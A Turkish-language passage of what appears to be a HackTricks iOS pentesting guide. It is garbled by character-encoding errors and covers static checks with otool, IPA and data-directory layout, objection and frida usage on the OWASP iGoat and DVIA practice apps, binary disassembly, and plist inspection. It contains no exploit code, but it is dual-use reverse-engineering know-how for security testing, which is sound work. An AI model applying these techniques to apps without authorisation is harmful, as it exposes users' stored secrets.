# iOS Pentesting

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturabilir ve otomatikleÅŸtirebilirsiniz.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nleri**](https://peass.creator-spring.com)'ni edinin
* Ã–zel [**NFT'ler**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u takip edin.
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek **hacking hilelerinizi paylaÅŸÄ±n**.

</details>

## iOS Temelleri

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

## Test OrtamÄ±

Bu sayfada **iOS simÃ¼latÃ¶rÃ¼**, **emÃ¼latÃ¶rler** ve **jailbreak** hakkÄ±nda bilgi bulabilirsiniz:

{% content-ref url="ios-testing-environment.md" %}
[ios-testing-environment.md](ios-testing-environment.md)
{% endcontent-ref %}

## Ä°lk Analiz

### Temel iOS Test Ä°ÅŸlemleri

Test sÄ±rasÄ±nda **birkaÃ§ iÅŸlem Ã¶nerilecek** (cihaza baÄŸlanma, dosya okuma/yazma/yÃ¼kleme/indirme, bazÄ± araÃ§larÄ± kullanma...). Bu nedenle, bu iÅŸlemlerin nasÄ±l gerÃ§ekleÅŸtirileceÄŸini bilmiyorsanÄ±z, lÃ¼tfen **sayfayÄ± okumaya baÅŸlayÄ±n**:

{% content-ref url="basic-ios-testing-operations.md" %}
[basic-ios-testing-operations.md](basic-ios-testing-operations.md)
{% endcontent-ref %}

{% hint style="info" %}
AÅŸaÄŸÄ±daki adÄ±mlar iÃ§in **uygulama cihaza yÃ¼klenmiÅŸ olmalÄ±** ve uygulamanÄ±n **IPA dosyasÄ±** zaten alÄ±nmÄ±ÅŸ olmalÄ±dÄ±r.\
Bunu nasÄ±l yapacaÄŸÄ±nÄ±zÄ± Ã¶ÄŸrenmek iÃ§in [Temel iOS Test Ä°ÅŸlemleri](basic-ios-testing-operations.md) sayfasÄ±nÄ± okuyun.
{% endhint %}

### Temel Statik Analiz

IPA dosyasÄ±na otomatik bir Statik Analiz yapmak iÃ§in [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) aracÄ±nÄ± kullanmanÄ±z Ã¶nerilir.

Binary'de bulunan **korumalarÄ±n tanÄ±mlanmasÄ±**:

*   **PIE (Position Independent Executable)**: EtkinleÅŸtirildiÄŸinde, uygulama her baÅŸlatÄ±ldÄ±ÄŸÄ±nda rastgele bir bellek adresine yÃ¼klenir, bu da baÅŸlangÄ±Ã§ bellek adresini tahmin etmeyi zorlaÅŸtÄ±rÄ±r.

```bash
otool -hv <app-binary> | grep PIE   # PIE bayraÄŸÄ±nÄ± iÃ§ermesi gerekiyor
```
*   **Stack Canaries**: YÄ±ÄŸÄ±nÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulamak iÃ§in, bir iÅŸlevi Ã§aÄŸÄ±rmadan Ã¶nce yÄ±ÄŸÄ±nda bir 'canary' deÄŸeri yerleÅŸtirilir ve iÅŸlev sona erdikten sonra tekrar doÄŸrulanÄ±r.

```bash
otool -I -v <app-binary> | grep stack_chk   # stack_chk_guard ve stack_chk_fail sembollerini iÃ§ermesi gerekiyor
```
*   **ARC (Automatic Reference Counting)**: Ortak bellek bozulma hatalarÄ±nÄ± Ã¶nlemek iÃ§in

```bash
otool -I -v <app-binary> | grep objc_release   # _objc_release sembolÃ¼nÃ¼ iÃ§ermesi gerekiyor
```
*   **ÅifrelenmiÅŸ Binary**: Binary ÅŸifrelenmiÅŸ olmalÄ±

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # cryptid 1 olmalÄ±
```

**Hassas/GÃ¼vensiz FonksiyonlarÄ±n TanÄ±mlanmasÄ±**

*   **ZayÄ±f Hash AlgoritmalarÄ±**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# Linux'ta
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```
*   **GÃ¼vensiz Rastgele Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# Linux'ta
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```
*   **GÃ¼vensiz 'Malloc' Fonksiyonu**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_malloc"

# Linux'ta
grep -iER "_malloc"
```
*   **GÃ¼vensiz ve SavunmasÄ±z Fonksiyonlar**

```bash
# iOS cihazÄ±nda
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# Linux'ta
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

### Temel Dinamik Analiz

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) tarafÄ±ndan gerÃ§ekleÅŸtirilen dinamik analizi kontrol edin. FarklÄ± gÃ¶rÃ¼nÃ¼mler arasÄ±nda gezinmeniz ve etkileÅŸimde bulunmanÄ±z gerekecek, ancak diÄŸer iÅŸlemleri yaparken birÃ§ok sÄ±nÄ±fa baÄŸlanacak ve bir rapor hazÄ±rlayacaktÄ±r.

### YÃ¼klenmiÅŸ UygulamalarÄ±n Listelenmesi

`frida-ps -Uai` komutunu kullanarak yÃ¼klenmiÅŸ uygulamalarÄ±n **bundle kimliÄŸini** belirleyin:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Temel SÄ±ralama ve Hooking

UygulamanÄ±n bileÅŸenlerini **sÄ±ralamanÄ±n** ve yÃ¶ntemleri ve sÄ±nÄ±flarÄ± kolayca **hooking** yapmanÄ±n nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenin:

{% content-ref url="ios-hooking-with-objection.md" %}
[ios-hooking-with-objection.md](ios-hooking-with-objection.md)
{% endcontent-ref %}

### IPA YapÄ±sÄ±

Bir **IPA dosyasÄ±nÄ±n** yapÄ±sÄ± temel olarak bir **sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ paketin** yapÄ±sÄ±dÄ±r. UzantÄ±sÄ±nÄ± `.zip` olarak yeniden adlandÄ±rarak, iÃ§eriÄŸini ortaya Ã§Ä±karmak iÃ§in **sÄ±kÄ±ÅŸtÄ±rÄ±labilir**. Bu yapÄ± iÃ§inde, bir **Paket** uygulamanÄ±n kaynaklarÄ±nÄ± kapsayan tamamen paketlenmiÅŸ bir uygulamayÄ± temsil eder.

* **`Info.plist`**: Bu dosya, uygulamanÄ±n belirli yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± iÃ§erir.
* **`_CodeSignature/`**: Bu dizin, paketteki tÃ¼m dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ saÄŸlayan bir imza iÃ§eren bir plist dosyasÄ±nÄ± iÃ§erir.
* **`Assets.car`**: Ä°konlar gibi varlÄ±k dosyalarÄ±nÄ± depolayan sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ bir arÅŸiv.
* **`Frameworks/`**: Bu klasÃ¶r, uygulamanÄ±n `.dylib` veya `.framework` dosyalarÄ± ÅŸeklinde olabilen yerel kitaplÄ±klarÄ±nÄ± barÄ±ndÄ±rÄ±r.
* **`PlugIns/`**: Bu, uygulamaya eklenti olarak adlandÄ±rÄ±lan `.appex` dosyalarÄ±nÄ± iÃ§erebilir, ancak her zaman mevcut deÄŸildir.
*Â [**`Core Data`**](https://developer.apple.com/documentation/coredata): Ã‡evrimdÄ±ÅŸÄ± kullanÄ±m iÃ§in uygulamanÄ±zÄ±n kalÄ±cÄ± verilerini kaydetmek, geÃ§ici verileri Ã¶nbelleÄŸe almak ve uygulamanÄ±za tek bir cihazda geri alma iÅŸlevselliÄŸi eklemek iÃ§in kullanÄ±lÄ±r. Bir iCloud hesabÄ±ndaki birden Ã§ok cihaz arasÄ±nda veri senkronizasyonu iÃ§in Core Data, ÅŸemanÄ±zÄ± otomatik olarak bir CloudKit konteynerine yansÄ±tÄ±r.
* [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` dosyasÄ±, uygulamanÄ±zÄ±n veya paketinizin tÃ¼rÃ¼nÃ¼ ve oluÅŸturucu kodlarÄ±nÄ± belirtmenin alternatif bir yoludur.
* **en.lproj, fr.proj, Base.lproj**: Bu, belirli diller iÃ§in kaynaklarÄ± iÃ§eren dil paketlerini ve desteklenmeyen bir dil iÃ§in varsayÄ±lan bir kaynaÄŸÄ± iÃ§eren dil paketlerini iÃ§eren dil paketleridir.
* **GÃ¼venlik**: `_CodeSignature/` dizini, dijital imzalar aracÄ±lÄ±ÄŸÄ±yla tÃ¼m paketlenmiÅŸ dosyalarÄ±n bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ doÄŸrulayarak uygulamanÄ±n gÃ¼venliÄŸinde kritik bir rol oynar.
* **VarlÄ±k YÃ¶netimi**: `Assets.car` dosyasÄ±, grafiksel varlÄ±klarÄ± verimli bir ÅŸekilde yÃ¶netmek iÃ§in sÄ±kÄ±ÅŸtÄ±rmayÄ± kullanÄ±r, bu da uygulama performansÄ±nÄ± optimize etmek ve genel boyutunu azaltmak iÃ§in Ã¶nemlidir.
* **Framework'ler ve Eklentiler**: Bu dizinler, iOS uygulamalarÄ±nÄ±n modÃ¼lerliÄŸini vurgular, geliÅŸtiricilere yeniden kullanÄ±labilir kod kitaplÄ±klarÄ±nÄ± (`Frameworks/`) ve uygulama iÅŸlevselliÄŸini geniÅŸletmelerini (`PlugIns/`) saÄŸlar.
* **YerelleÅŸtirme**: YapÄ±, birden Ã§ok dil iÃ§in desteklenen kaynaklarÄ± iÃ§ererek kÃ¼resel uygulama eriÅŸimini kolaylaÅŸtÄ±rÄ±r.

**Info.plist**

**Info.plist**, iOS uygulamalarÄ± iÃ§in bir kÃ¶ÅŸe taÅŸÄ± olarak hizmet eder ve **anahtar-deÄŸer** Ã§iftleri ÅŸeklindeki Ã¶nemli yapÄ±landÄ±rma verilerini kapsar. Bu dosya, yalnÄ±zca uygulamalar iÃ§in deÄŸil, aynÄ± zamanda iÃ§inde paketlenmiÅŸ uygulama uzantÄ±larÄ± ve Ã§erÃ§eveler iÃ§in de gereklidir. XML veya ikili bir formatta yapÄ±landÄ±rÄ±lmÄ±ÅŸ olup, uygulama izinlerinden gÃ¼venlik yapÄ±landÄ±rmalarÄ±na kadar Ã¶nemli bilgileri iÃ§erir. Mevcut anahtarlar hakkÄ±nda ayrÄ±ntÄ±lÄ± bir keÅŸif iÃ§in, [**Apple GeliÅŸtirici Belgelerine**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc) baÅŸvurulabilir.

Bu dosya ile daha eriÅŸilebilir bir formatta Ã§alÄ±ÅŸmak isteyenler iÃ§in, XML dÃ¶nÃ¼ÅŸÃ¼mÃ¼ macOS'ta `plutil` (sÃ¼rÃ¼m 10.2 ve sonraki sÃ¼rÃ¼mlerde doÄŸal olarak mevcut) veya Linux'ta `plistutil` kullanÄ±larak kolayca gerÃ§ekleÅŸtirilebilir. DÃ¶nÃ¼ÅŸÃ¼m iÃ§in kullanÄ±lan komutlar aÅŸaÄŸÄ±daki gibidir:

- **macOS iÃ§in**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Linux iÃ§in**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** dosyasÄ±nÄ±n ifÅŸa edebileceÄŸi bilgiler arasÄ±nda, dikkate deÄŸer giriÅŸler arasÄ±nda uygulama izin dizeleri (`UsageDescription`), Ã¶zel URL ÅŸemalarÄ± (`CFBundleURLTypes`) ve App Transport Security iÃ§in yapÄ±landÄ±rmalar (`NSAppTransportSecurity`) bulunur. Bu giriÅŸler, diÄŸerleriyle birlikte (`UTExportedTypeDeclarations` / `UTImportedTypeDeclarations`) dÄ±ÅŸa aktarÄ±lan / iÃ§e aktarÄ±lan Ã¶zel belge tÃ¼rleri gibi, dosyanÄ±n incelenmesi veya basit bir `grep` komutu kullanÄ±larak kolayca bulunabilir:
```bash
$ grep -i <keyword> Info.plist
```
**Veri YollarÄ±**

iOS ortamÄ±nda, dizinler Ã¶zel olarak **sistem uygulamalarÄ±** ve **kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar** iÃ§in ayrÄ±lmÄ±ÅŸtÄ±r. Sistem uygulamalarÄ± `/Applications` dizininde bulunurken, kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamalar `/private/var/containers/` altÄ±na yerleÅŸtirilir. Bu uygulamalara **128-bit UUID** olarak bilinen benzersiz bir tanÄ±mlayÄ±cÄ± atanÄ±r, bu nedenle dizin adlarÄ±nÄ±n rastgele olmasÄ± nedeniyle bir uygulamanÄ±n klasÃ¶rÃ¼nÃ¼ manuel olarak bulmak zor olabilir.

Bir kullanÄ±cÄ± tarafÄ±ndan yÃ¼klenen uygulamanÄ±n kurulum dizinini keÅŸfetmeyi kolaylaÅŸtÄ±rmak iÃ§in **objection aracÄ±**, `env` adlÄ± kullanÄ±ÅŸlÄ± bir komut saÄŸlar. Bu komut, sÃ¶z konusu uygulama iÃ§in ayrÄ±ntÄ±lÄ± dizin bilgilerini ortaya Ã§Ä±karÄ±r. AÅŸaÄŸÄ±da bu komutun nasÄ±l kullanÄ±lacaÄŸÄ±na dair bir Ã¶rnek verilmiÅŸtir:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
Alternatif olarak, uygulama adÄ± `find` komutu kullanÄ±larak `/private/var/containers` iÃ§inde aranabilir:
```bash
find /private/var/containers -name "Progname*"
```
`ps` ve `lsof` gibi komutlar, uygulamanÄ±n sÃ¼recini belirlemek ve aÃ§Ä±k dosyalarÄ± listelemek iÃ§in kullanÄ±labilir. Bu komutlar, uygulamanÄ±n etkin dizin yollarÄ± hakkÄ±nda bilgi saÄŸlar:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Paket dizini:**

* **AppName.app**
* Bu, IPA'da daha Ã¶nce gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi Uygulama Paketi'dir ve temel uygulama verilerini, statik iÃ§eriÄŸi ve uygulamanÄ±n derlenmiÅŸ ikili dosyasÄ±nÄ± iÃ§erir.
* Bu dizin kullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r, ancak **kullanÄ±cÄ±lar buraya yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Bu klasÃ¶rÃ¼n iÃ§eriÄŸi, kod imzasÄ±nÄ± **doÄŸrulamak** iÃ§in kullanÄ±lÄ±r.

**Veri dizini:**

* **Documents/**
* KullanÄ±cÄ± tarafÄ±ndan oluÅŸturulan tÃ¼m verileri iÃ§erir. Uygulama son kullanÄ±cÄ±sÄ± bu verilerin oluÅŸturulmasÄ±nÄ± baÅŸlatÄ±r.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nÃ¼r ve **kullanÄ±cÄ±lar buraya yazabilir**.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/**
* KullanÄ±cÄ±ya Ã¶zgÃ¼ olmayan tÃ¼m dosyalarÄ± iÃ§erir, Ã¶rneÄŸin Ã¶nbellekler, tercihler, Ã§erezler ve Ã¶zellik listesi (plist) yapÄ±landÄ±rma dosyalarÄ±.
* iOS uygulamalarÄ± genellikle `Application Support` ve `Caches` alt dizinlerini kullanÄ±r, ancak uygulama Ã¶zel alt dizinler oluÅŸturabilir.
* **Library/Caches/**
* YarÄ± kalÄ±cÄ± Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ dosyalarÄ± iÃ§erir.
* KullanÄ±cÄ±lara gÃ¶rÃ¼nmez ve **kullanÄ±cÄ±lar buraya yazamaz**.
* Bu dizindeki iÃ§erik **yedeklenmez**.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.
* **Library/Application Support/**
* UygulamanÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in gerekli olan **kalÄ±cÄ± dosyalarÄ±** iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez** ve kullanÄ±cÄ±lar buraya yazamaz.
* Bu dizindeki iÃ§erik **yedeklenir**.
* Uygulama, `NSURLIsExcludedFromBackupKey` ayarlayarak yollarÄ± devre dÄ±ÅŸÄ± bÄ±rakabilir.
* **Library/Preferences/**
* Bir uygulama yeniden baÅŸlatÄ±ldÄ±ktan sonra bile **kalÄ±cÄ± olarak saklanabilen** Ã¶zellikleri depolamak iÃ§in kullanÄ±lÄ±r.
* Bilgiler, ÅŸifrelenmemiÅŸ olarak, uygulama sandbox'Ä±nÄ±n iÃ§inde \[BUNDLE\_ID].plist adlÄ± bir plist dosyasÄ±nda kaydedilir.
* `NSUserDefaults` kullanÄ±larak depolanan tÃ¼m anahtar/deÄŸer Ã§iftleri bu dosyada bulunabilir.
* **tmp/**
* Uygulama baÅŸlatmalarÄ± arasÄ±nda kalÄ±cÄ± olmasÄ± gerekmeyen **geÃ§ici dosyalarÄ±** yazmak iÃ§in bu dizini kullanÄ±n.
* KalÄ±cÄ± olmayan Ã¶nbelleÄŸe alÄ±nmÄ±ÅŸ dosyalarÄ± iÃ§erir.
* KullanÄ±cÄ±lara **gÃ¶rÃ¼nmez**.
* Bu dizindeki iÃ§erik yedeklenmez.
* Uygulama Ã§alÄ±ÅŸmÄ±yorken ve depolama alanÄ± azaldÄ±ÄŸÄ±nda iÅŸletim sistemi bu dizinin dosyalarÄ±nÄ± otomatik olarak silebilir.

Ä°Goat-Swift'in Paket Dizini (.app) dizinine, Bundle dizini iÃ§indeki (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`) bir gÃ¶z atalÄ±m:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Tersine MÃ¼hendislik

`<application-name>.app` klasÃ¶rÃ¼ iÃ§inde `<application-name>` adÄ±nda bir ikili dosya bulacaksÄ±nÄ±z. Bu dosya **Ã§alÄ±ÅŸtÄ±rÄ±lacak** olan dosyadÄ±r. Ä°kili dosyanÄ±n temel bir incelemesini **`otool`** aracÄ±yla yapabilirsiniz:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**Uygulama ÅŸifreli mi kontrol edin**

AÅŸaÄŸÄ±daki komutu kullanarak herhangi bir Ã§Ä±ktÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol edin:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**Binary dosyasÄ±nÄ±n disassembling iÅŸlemi**

Metin bÃ¶lÃ¼mÃ¼nÃ¼ disassemble edin:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
Ã–rnek uygulamanÄ±n **Objective-C segmentini** yazdÄ±rmak iÃ§in ÅŸunu kullanabilirsiniz:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
Daha kompakt bir Objective-C kod elde etmek iÃ§in [**class-dump**](http://stevenygard.com/projects/class-dump/) kullanabilirsiniz:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
Ancak, ikili dosyayÄ± parÃ§alamak iÃ§in en iyi seÃ§enekler: [**Hopper**](https://www.hopperapp.com/download.html?) ve [**IDA**](https://www.hex-rays.com/products/ida/support/download\_freeware/).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dÃ¼nyanÄ±n en geliÅŸmiÅŸ topluluk araÃ§larÄ± tarafÄ±ndan desteklenen **iÅŸ akÄ±ÅŸlarÄ±nÄ± kolayca oluÅŸturun ve otomatikleÅŸtirin**.\
BugÃ¼n EriÅŸim AlÄ±n:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Veri Depolama

iOS'un cihazda veri depolama ÅŸekli hakkÄ±nda bilgi edinmek iÃ§in bu sayfayÄ± okuyun:

{% content-ref url="ios-basics.md" %}
[ios-basics.md](ios-basics.md)
{% endcontent-ref %}

{% hint style="warning" %}
Bilgilerin depolanabileceÄŸi aÅŸaÄŸÄ±daki yerler, uygulama **kurulduktan hemen sonra**, uygulamanÄ±n **tÃ¼m iÅŸlevlerini kontrol ettikten sonra** ve hatta **bir kullanÄ±cÄ±dan Ã§Ä±kÄ±ÅŸ yapÄ±p baÅŸka bir kullanÄ±cÄ±ya giriÅŸ yaptÄ±ktan sonra** kontrol edilmelidir.\
AmaÃ§, uygulamanÄ±n (ÅŸifreler, tokenlar), mevcut kullanÄ±cÄ±nÄ±n ve Ã¶nceki oturum aÃ§mÄ±ÅŸ kullanÄ±cÄ±larÄ±n **korumasÄ±z hassas bilgilerini** bulmaktÄ±r.
{% endhint %}

### Plist

**plist** dosyalarÄ±, **anahtar-deÄŸer Ã§iftlerini iÃ§eren** yapÄ±landÄ±rÄ±lmÄ±ÅŸ XML dosyalarÄ±dÄ±r. Bu dosyalarda bazen **hassas bilgiler bulabilirsiniz**. Yeni veri yazÄ±lÄ±p yazÄ±lmadÄ±ÄŸÄ±nÄ± gÃ¶rmek iÃ§in uygulamayÄ± kurduktan ve yoÄŸun bir ÅŸekilde kullandÄ±ktan sonra bu dosyalarÄ± kontrol etmek Ã¶nerilir.

Plist dosyalarÄ±nda verileri kalÄ±cÄ± olarak depolamanÄ±n en yaygÄ±n yolu **NSUserDefaults** kullanmaktÄ±r. Bu plist dosyasÄ±, **`Library/Preferences/<appBundleID>.plist`** dizininde uygulama sandbox'Ä±nÄ±n iÃ§inde kaydedilir.

[`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) sÄ±nÄ±fÄ±, varsayÄ±lan sistemle etkileÅŸimde bulunmak iÃ§in programatik bir arayÃ¼z saÄŸlar. VarsayÄ±lan sistem, bir uygulamanÄ±n **kullanÄ±cÄ± tercihlerine** gÃ¶re davranÄ±ÅŸÄ±nÄ± Ã¶zelleÅŸtirmesine izin verir. `NSUserDefaults` tarafÄ±ndan kaydedilen veriler uygulama paketi iÃ§inde gÃ¶rÃ¼ntÃ¼lenebilir. Bu sÄ±nÄ±f, verileri bir plist dosyasÄ±nda saklar, ancak kÃ¼Ã§Ã¼k miktarda veriyle kullanÄ±lmasÄ± amaÃ§lanmÄ±ÅŸtÄ±r.

Bu verilere doÄŸrudan gÃ¼venilir bir bilgisayar Ã¼zerinden eriÅŸilemez, ancak bir **yedekleme** yaparak eriÅŸilebilir.

`NSUserDefaults` kullanarak kaydedilen bilgileri objection'Ä±n `ios nsuserdefaults get` komutunu kullanarak **dÃ¶kÃ¼mleyebilirsiniz**.

Uygulama tarafÄ±ndan kullanÄ±lan tÃ¼m plist dosyalarÄ±nÄ± bulmak iÃ§in `/private/var/mobile/Containers/Data/Application/{APPID}` dizinine eriÅŸebilir ve aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```bash
find ./ -name "*.plist"
```
**XML veya ikili (bplist)** formatÄ±ndaki dosyalarÄ± XML'e dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in, iÅŸletim sisteminize baÄŸlÄ± olarak Ã§eÅŸitli yÃ¶ntemler mevcuttur:

**MacOS KullanÄ±cÄ±larÄ± Ä°Ã§in:**
`plutil` komutunu kullanÄ±n. Bu, macOS (10.2+) iÃ§in yerleÅŸik bir araÃ§tÄ±r ve bu amaÃ§la tasarlanmÄ±ÅŸtÄ±r:
```bash
$ plutil -convert xml1 Info.plist
```
**Linux KullanÄ±cÄ±larÄ± Ä°Ã§in:**
Ã–ncelikle `libplist-utils`'u yÃ¼kleyin, ardÄ±ndan dosyanÄ±zÄ± dÃ¶nÃ¼ÅŸtÃ¼rmek iÃ§in `plistutil` kullanÄ±n:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Bir Objection Oturumu Ä°Ã§inde:**
Mobil uygulamalarÄ± analiz etmek iÃ§in, plist dosyalarÄ±nÄ± doÄŸrudan dÃ¶nÃ¼ÅŸtÃ¼rmenizi saÄŸlayan Ã¶zel bir komut bulunmaktadÄ±r:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

